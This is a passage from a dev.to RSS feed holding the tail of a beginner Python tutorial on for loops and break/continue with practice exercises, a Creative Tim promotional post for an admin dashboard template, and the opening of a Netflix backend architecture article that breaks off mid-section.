&lt;/span&gt;  &lt;span class="n"&gt;File&lt;/span&gt; &lt;span class="s"&gt;"&amp;lt;stdin&amp;gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"hello"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="o"&gt;^&lt;/span&gt;
&lt;span class="nb"&gt;IndentationError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;expected&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="n"&gt;indented&lt;/span&gt; &lt;span class="n"&gt;block&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;  &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"hello"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="n"&gt;hello&lt;/span&gt;
&lt;span class="n"&gt;hello&lt;/span&gt;
&lt;span class="n"&gt;hello&lt;/span&gt;
&lt;span class="n"&gt;hello&lt;/span&gt;
&lt;span class="n"&gt;hello&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Okay, the running variable i is incremented by 1. So until i equals five, the program keeps on running? Well, actually no. 😲 This happens in Java and C. But Python differs a bit over here.&lt;/p&gt;

&lt;p&gt;In Python, the running variable is assigned a new value and not incremented. 😮 What happens is something like this- When you say "for i in range(5)", a list of numbers from zero to four [0, 1, 2, 3, 4] will be generated. (Note 0-4 and not 0-5). Then i will be assigned all the values from that list, in order, one by one. Even if we change the value of i in the middle, it doesn't affect the loop as i is just assigned the next value. more about it &lt;a href="https://stackoverflow.com/questions/15902835/changing-iteration-variable-inside-for-loop-in-python"&gt;here&lt;/a&gt; I know, loss of flexibility.😢 But we can always convert the for loop into a while loop. 🙃&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;  &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;  &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"hi"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="n"&gt;hi&lt;/span&gt;
&lt;span class="n"&gt;hi&lt;/span&gt;
&lt;span class="n"&gt;hi&lt;/span&gt;
&lt;span class="n"&gt;hi&lt;/span&gt;
&lt;span class="n"&gt;hi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Although we cannot change the running variable, there is no restriction against using it. If we want to change the default value of increment of i in the list, we can add another parameter in the for loop, as shown below.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="c1"&gt;#here 2 represents the increment values.
&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;  &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="mi"&gt;4&lt;/span&gt;
&lt;span class="mi"&gt;6&lt;/span&gt;
&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here is a sample program to find factors of a number. There are two bugs in the program. Can you fix them? 🥳&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Enter a number"&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If you have already spotted them, comment the answers below👇. For those who havent, the answer is &lt;a href="https://github.com/Aatmaj-Zephyr/Learning-Python/blob/9ad617687edd015e156cd6e3682c1a8eff704dca/Basic/Day%204/Exercise%20solutions/Exercise%201.py"&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The range() function makes a list of values, and the running variable is assigned the values one by one. We can also make a list manually, but that part is to be covered when dealing with Python lists, later 📅.&lt;/p&gt;

&lt;p&gt;One thing to note here is that any changes in the  variable indicating the end values doesn't affect the main program. 😐Example, in the above program if we change the value of n in the indent, it wont affect the number of times the statements are executed. This is because the range list is made already using the value we have given at the time of generating the for lop. Here is a program in which the values of end variable are changed, but the program won't get affected. 🤓&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="c1"&gt;#Program to find the factorial of a number
&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Enter a number "&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;    
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Break statement&lt;/strong&gt;- The break statement is used to end the for loop in middle. After this statement is executed, the last for loop terminates, and the control goes to the next statements&lt;br&gt;
Similarly Python has the continue statement, which starts the next iteration of the loop again. Syntax is as follows-&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="k"&gt;break&lt;/span&gt;
&lt;span class="k"&gt;continue&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;For those who are new to the concept, you will find a really good explanation &lt;a href="https://www.programiz.com/python-programming/break-continue"&gt;here&lt;/a&gt;. &lt;br&gt;
Here is an example- This program finds if a number is prime or not.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Enter a number "&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="n"&gt;IsPrime&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"The number is composite "&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;IsPrime&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IsPrime&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
 &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"The number is prime."&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Don't get disheartened if all things are not clear right away. We are going to solve many more sample questions in the next lectures. 😎 Do try these exercises given below, (or at least see the answers). This will help strengthen the concepts or reinforce them further. 💥&lt;/p&gt;

&lt;p&gt;Exercise-&lt;br&gt;
2) Write a program to calculate the factors, the sum of the factors and the number of factors of the number. &lt;a href="https://github.com/Aatmaj-Zephyr/Learning-Python/blob/00fa89c2d1acbc38ef381d33cf6a4da3da253267/Basic/Day%204/Exercise%20solutions/Exercise%202.py"&gt;Answer&lt;/a&gt;&lt;br&gt;
3) Write a program to find if a number is a perfect number or not. (Perfect number is a number whose sum of factors excluding itself is equal to number eg 6,28 are perfect numbers) &lt;a href="https://github.com/Aatmaj-Zephyr/Learning-Python/blob/a3ae9361a8cf54c870d9bb6b6f31061858a03333/Basic/Day%204/Exercise%20solutions/Exercise%203.py"&gt;Answer&lt;/a&gt;&lt;/p&gt;




&lt;p&gt;Yes, these exercises were repetitive.🥱 But tomorrow we will do some really fantastic questions which actually are asked in interviews. Follow me for updates so you don't miss out on tomorrows special edition of learning Python course 😁. &lt;br&gt;
😉&lt;/p&gt;

&lt;p&gt;😎 Your suggestions motivate me, so please please please let me know in the comment section if you this part or not. 🧐 And don't forget to like the post if you did. 😍 &lt;/p&gt;

</description>
    </item>
    <item>
      <title>Meet the most Complex &amp; Innovative Admin from Creative Tim</title>
      <author>Creative Tim</author>
      <pubDate>Thu, 24 Jun 2021 08:33:38 +0000</pubDate>
      <link>https://dev.to/creativetim_official/meet-the-most-complex-innovative-admin-from-creative-tim-3aki</link>
      <guid>https://dev.to/creativetim_official/meet-the-most-complex-innovative-admin-from-creative-tim-3aki</guid>
      <description>&lt;p&gt;Over the last few months, we have been working on a brand-new, modern admin template to help developers streamline their development process. In a highly competitive market such as web development, the trends, standards, and techniques are constantly changing. We, at Creative Tim, have always wanted to deliver great tools to all the web developers. Therefore, we have analyzed tendencies and adapted them to our know-how in order to deliver a tool that satisfies the developer’s needs and expectations.&lt;/p&gt;

&lt;p&gt;Meet &lt;strong&gt;&lt;a href="https://www.creative-tim.com/product/soft-ui-dashboard-pro?ref=devto"&gt;Soft UI Dashboard PRO&lt;/a&gt;&lt;/strong&gt;, the most complex and innovative dashboard made by Creative Tim! Why “the most”? Because of its very modern-looking and high-quality code that make it the perfect dashboard for different purposes: from CRM admins to automotive or virtual reality admins.&lt;/p&gt;

&lt;p&gt;Are you interested in finding out more about our latest product? Read on!&lt;/p&gt;




&lt;h3&gt;
  &lt;a href="#latest-technology-bootstrap-5"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Latest Technology: Bootstrap 5&lt;/strong&gt;
&lt;/h3&gt;

&lt;p&gt;For this product, we’ve decided to use the latest version of Bootstrap, considering its popularity – “&lt;a href="https://getbootstrap.com/"&gt;Bootstrap, the world’s most popular framework for building responsive, mobile-first sites&lt;/a&gt;” and its out-of-the-box solutions to create responsive and dynamic interfaces. Soft UI Dashboard PRO is following the latest code standards provided by the guys from Bootstrap, so you will love working with this dashboard!&lt;/p&gt;




&lt;h3&gt;
  &lt;a href="#innovative-design"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Innovative Design&lt;/strong&gt;
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;  &lt;strong&gt;Gradients&lt;/strong&gt;: We wanted to give our product a fresh, realistic feeling; therefore, we used gradients, &lt;a href="https://www.creative-tim.com/blog/web-design/web-design-trends/?ref=devto"&gt;a popular trend for this year:&lt;/a&gt;
&lt;a href="https://www.creative-tim.com/product/soft-ui-dashboard-pro?ref=devto"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--FVE9BMn5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://creativetimblog.com/blog/wp-content/uploads/2021/06/gradients.jpg" alt="gradients"&gt;&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;  &lt;strong&gt;3D Interactive Elements&lt;/strong&gt;: Interactive 3D design encourages users to stay longer. Knowing this, we’ve integrated 3D elements into &lt;a href="https://www.creative-tim.com/product/soft-ui-dashboard-pro?ref=devto"&gt;Soft UI Dashboard PRO&lt;/a&gt; to create an innovative and attractive feel for the users:
&lt;a href="https://www.creative-tim.com/product/soft-ui-dashboard-pro?ref=devto"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--3SwPUVSV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://creativetimblog.com/blog/wp-content/uploads/2021/06/3d-elements.jpg" alt="3D Interactive Elements"&gt;&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;  &lt;strong&gt;Glassmorphism&lt;/strong&gt;: If you are a fan of glassomorphism too, you will fall in love with our product. We used transparent and blurred-out backgrounds with colorful images and shapes to create the glass effect that the big ones in the industry, like Apple and Microsoft, are using:
&lt;a href="https://www.creative-tim.com/product/soft-ui-dashboard-pro?ref=devto"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qcisHFqF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://creativetimblog.com/blog/wp-content/uploads/2021/06/glassmorphism.jpg" alt="Glassmorphism"&gt;&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;




&lt;h3&gt;
  &lt;a href="#complex-components"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Complex Components&lt;/strong&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Elements&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.creative-tim.com/product/soft-ui-dashboard-pro?ref=devto"&gt;Soft UI Dashboard&lt;/a&gt; is a “Developer First” product, with a lot of variables for colors, fonts, sizes, and other elements. It is built with over 300 frontend individual elements, like buttons, inputs, navbars, nav tabs, cards, or alerts, giving you the freedom of choosing and combining. All components can easily be modified using SASS files and classes.&lt;/p&gt;

&lt;p&gt;View &lt;a href="https://www.creative-tim.com/learning-lab/bootstrap/alerts/soft-ui-dashboard?ref=devto"&gt;all components here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Prebuilt Design Blocks&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Our product comes with prebuilt design blocks, so the development process is seamless. Having multiple different sections designed, web developers can then create each module and assemble them in different sequences to create unique pages and templates.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Plugins&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Our dashboard is ready to help you built powerful and complex products. We’ve integrated 14 customized plugins that extend the features and can add more interaction or functionalities to your site: Kanban, Sweet Alerts, Wizard, Choices, Fullcalendar, and many more.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example Pages&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Lack of inspiration? No worries! Our example pages are ready to get you on track when you want to show something directly to your clients or quickly set up the basic structure for your web project. &lt;a href="https://www.creative-tim.com/product/soft-ui-dashboard-pro?ref=devto"&gt;Soft UI Dashboard PRO&lt;/a&gt; contains 54 beautiful ready-to-use pages, from the basic Profil Page to Automotive, Virtual Reality, and  CRM admin pages. &lt;br&gt;
Let’s see some of our example pages:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;a href="https://demos.creative-tim.com/soft-ui-dashboard-pro/pages/dashboards/crm.html?ref=devto"&gt;CRM Admin Page&lt;/a&gt;&lt;/em&gt;&lt;br&gt;
&lt;a href="https://demos.creative-tim.com/soft-ui-dashboard-pro/pages/dashboards/crm.html?ref=devto"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--pfSYihKo--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://creativetimblog.com/blog/wp-content/uploads/2021/06/example-1-2.jpg" alt="CRM Admin Page"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;a href="https://demos.creative-tim.com/soft-ui-dashboard-pro/pages/dashboards/smart-home.html?ref=devto"&gt;Smart Home Admin Page&lt;/a&gt;&lt;/em&gt;&lt;br&gt;
&lt;a href="https://demos.creative-tim.com/soft-ui-dashboard-pro/pages/dashboards/smart-home.html?ref=devto"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--T85T-nwt--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://creativetimblog.com/blog/wp-content/uploads/2021/06/example-2.jpg" alt="Smart Home Admin Page"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;a href="https://demos.creative-tim.com/soft-ui-dashboard-pro/pages/dashboards/automotive.html?ref=devto"&gt;Automative Admin Page&lt;/a&gt;&lt;/em&gt;&lt;br&gt;
&lt;a href="https://demos.creative-tim.com/soft-ui-dashboard-pro/pages/dashboards/automotive.html?ref=devto"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--xmOjj4It--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://creativetimblog.com/blog/wp-content/uploads/2021/06/example-3.jpg" alt="Automative Admin Page"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;a href="https://demos.creative-tim.com/soft-ui-dashboard-pro/pages/dashboards/vr/vr-default.html?ref=devto"&gt;Virtual Reality Admin Page&lt;/a&gt;&lt;/em&gt;&lt;br&gt;
&lt;a href="https://demos.creative-tim.com/soft-ui-dashboard-pro/pages/dashboards/vr/vr-default.html?ref=devto"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--kvDmOBgn--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://creativetimblog.com/blog/wp-content/uploads/2021/06/example-4.jpg" alt="Virtual Reality Admin Page"&gt;&lt;/a&gt;&lt;/p&gt;




&lt;h3&gt;
  &lt;a href="#pricing"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Pricing&lt;/strong&gt;
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://www.creative-tim.com/product/soft-ui-dashboard-pro?ref=devto"&gt;Soft UI Dashboard Pro&lt;/a&gt; comes with 3 available licenses:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  &lt;strong&gt;$79&lt;/strong&gt; Freelancer license, including 1 Developer access, 6 Months of Tech Support, and 6 Months of Free Updates&lt;/li&gt;
&lt;li&gt;  &lt;strong&gt;$149&lt;/strong&gt; Company license, including up to 10 Developers access, 12 Months of Tech Support, and 12 Months of Free Updates&lt;/li&gt;
&lt;li&gt;  &lt;strong&gt;$449&lt;/strong&gt; Enterprise license, including more than 10 Developer access, 18 Months of Tech Support, and 18 Months of Free Updates&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Check out more detail &lt;a href="https://www.creative-tim.com/product/soft-ui-dashboard-pro?ref=devto"&gt;here&lt;/a&gt;.&lt;/p&gt;




&lt;h3&gt;
  &lt;a href="#free-version"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Free Version&lt;/strong&gt;
&lt;/h3&gt;

&lt;p&gt;Not sure yet? Try out the &lt;strong&gt;&lt;a href="https://www.creative-tim.com/product/soft-ui-dashboard?ref=devto"&gt;free demo&lt;/a&gt;&lt;/strong&gt; and get the feel of Soft UI Dashboard Pro.&lt;br&gt;
&lt;a href="https://www.creative-tim.com/product/soft-ui-dashboard?ref=devto"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--R4baI3BT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://creativetimblog.com/blog/wp-content/uploads/2021/06/soft-ui-dashboard-1.jpg" alt="free demo"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The difference between the demo and the premium version consists in its number of components. The quality remains the same. Here’s what you will get with &lt;strong&gt;&lt;a href="https://www.creative-tim.com/product/soft-ui-dashboard?ref=devto"&gt;Soft UI Dashboard&lt;/a&gt;&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  10 Handcrafted Elements&lt;/li&gt;
&lt;li&gt;  1 Customized Plugins&lt;/li&gt;
&lt;li&gt;  7 Example Pages&lt;/li&gt;
&lt;/ul&gt;




&lt;h3&gt;
  &lt;a href="#final-thoughts"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Final Thoughts&lt;/strong&gt;
&lt;/h3&gt;

&lt;p&gt;We really hope you will enjoy this user-friendly dashboard! Get a look and share your feedback with us. Don’t forget to check its &lt;a href="https://www.creative-tim.com/learning-lab/bootstrap/overview/soft-ui-dashboard?ref=devto"&gt;complex documentation&lt;/a&gt;.&lt;/p&gt;

</description>
      <category>webdev</category>
      <category>bootstrap5</category>
      <category>admin</category>
      <category>webperf</category>
    </item>
    <item>
      <title>Netflix System Design- Backend Architecture</title>
      <author>Elegberun Olugbenga</author>
      <pubDate>Thu, 24 Jun 2021 08:09:38 +0000</pubDate>
      <link>https://dev.to/gbengelebs/netflix-system-design-backend-architecture-10i3</link>
      <guid>https://dev.to/gbengelebs/netflix-system-design-backend-architecture-10i3</guid>
      <description>&lt;p&gt;&lt;em&gt;Cover Photo by &lt;a href="https://unsplash.com/@alexbemore?utm_source=unsplash&amp;amp;utm_medium=referral&amp;amp;utm_content=creditCopyText"&gt;Alexander Shatov&lt;/a&gt; on &lt;a href="https://unsplash.com/s/photos/netflix?utm_source=unsplash&amp;amp;utm_medium=referral&amp;amp;utm_content=creditCopyText"&gt;Unsplash&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Netflix accounts for about 15% of the world's internet bandwidth traffic. Serving over 6 billion hours of content per month, globally, to nearly every country in the world. Building a robust, highly scalable, reliable, and efficient backend system is no small engineering feat but the ambitious team at Netflix has proven that problems exist to be solved.&lt;/p&gt;

&lt;p&gt;This article provides an analysis of the Netflix system architecture as researched from online sources. Section 1 will provide a simplified overview of the Netflix system. Section 2 is an overview of the backend architecture and section 3 provides a detailed look at the individual system components.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#1-overview"&gt;
  &lt;/a&gt;
  1. Overview
&lt;/h2&gt;

&lt;p&gt;Netflix operates in two clouds Amazon Web Services and Open Connect(Netflix content delivery network).&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--q7uxrcOU--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4rq466utjqzmkvt5jjrz.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--q7uxrcOU--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4rq466utjqzmkvt5jjrz.png" alt="Netflix-High-Level-System-Architecture"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The overall Netflix system consists of three main parts.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Open Connect Appliances(OCA)&lt;/strong&gt; - Open Connect is Netflix’s custom global content delivery network(CDN). These OCAs servers are placed inside internet service providers (ISPs) and internet exchange locations (IXPs) networks around the world to deliver Netflix content to users.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Client&lt;/strong&gt; - A client is any device from which you play the video from Netflix. This consists of all the applications that interface with the Netflix servers.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Netflix supports a lot of different devices including smart TV, Android, iOS platforms, gaming consoles, etc. All these apps are written using platform-specific code. Netflix web app is written using reactJS which was influenced by several factors some of which include startup speed, runtime performance, and modularity.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;Backend&lt;/strong&gt; - This includes databases, servers, logging frameworks, application monitoring, recommendation engine, background services, etc... When the user loads the Netflix app all requests are handled by the backend server in AWS Eg: Login, recommendations, the home page, users history, billing, customer support. Some of these backend services include (AWS EC2 instances, AWS S3, AWS DynamoDB, Cassandra, Hadoop, Kafka, etc).&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#2-backend-architecture"&gt;
  &lt;/a&gt;
  2. Backend Architecture
&lt;/h2&gt;

&lt;p&gt;Netflix is one of the major drivers of microservices architecture. Every component of their system is a collection of loosely coupled services collaborating. The microservice architecture enables the rapid, frequent and reliable delivery of large, complex applications. The figure below is an overview of the backend architecture.&lt;br&gt;
